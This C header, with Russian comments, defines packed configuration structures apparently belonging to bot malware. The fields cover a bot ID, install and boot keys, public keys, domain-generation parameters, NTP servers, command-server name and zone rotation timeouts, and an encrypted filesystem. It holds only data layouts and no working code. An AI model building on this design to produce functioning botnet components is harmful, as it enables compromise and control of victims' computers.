#ifndef __MOD_CONFIGAPI_H_
#define __MOD_CONFIGAPI_H_

#pragma pack(push, 1)

typedef struct _reserved_space
{
    char botId[65];
    uint8_t installKey[48];

    uint8_t reserved[1024 - 48 - 65/**/];
} reserved_space_t, *preserved_space_t;

typedef struct _configuration
{
    const char block_header[8];

    uint8_t publicSKey[520];
    uint8_t publicKey[520];

    uint32_t sid;

    char names[1024];
    uint32_t activeName;
    char zones[128];
    uint32_t activeZone;
    uint32_t lastNtpGenTime;

    char ntpServers[64];                // Список NTP-серверов.
    uint32_t activeNtpServer;           // Индекс текущего NTP-сервера.

    uint16_t rtr_names_count;
    uint32_t rtr_names_timeout;
    uint32_t rtr_end_of_names_timout;
    uint32_t rtr_zones_timeout;
    uint16_t rtr_all_names_attempts;
    uint32_t rtr_all_names_timeout;
    uint32_t rtr_names_lifetime;
    uint32_t rtr_check_tasks_timeout;

    uint16_t gen_min_name_len;
    uint16_t gen_max_name_len;
    uint32_t gen_unique_period;

    uint32_t fsCacheSize;               // Размер кеша файловой системы.
    uint32_t fsSize;                    // Размер блочного устройства файловой системы.

    reserved_space_t;

    const char block_hashsum[8];
} configuration_t, *pconfiguration_t;

#pragma pack(pop)
// 
// typedef struct _mod_config_private
// {
// 	pconfiguration_t pConfig;
//     puchar_t pModBase;
// 
// 	// Динамические параметры.
// 	uint32_t serverAddr;
// 	uint16_t serverPort;
// 
//     uint8_t bootKey[48];
//     uint8_t fsKey[48];
// 
// 	char uniqueId[33 + 3/*padding*/];
// } mod_config_private_t, *pmod_config_private_t;
// 
// 
// typedef NTSTATUS (*Fnconfig_save)();
// 
// typedef struct _mod_config_block
// {
//     Fnconfig_save fnconfig_save;
// 	
// 	mod_config_private_t;
// } mod_config_block_t, *pmod_config_block_t;

#endif // __MOD_CONFIGAPI_H_
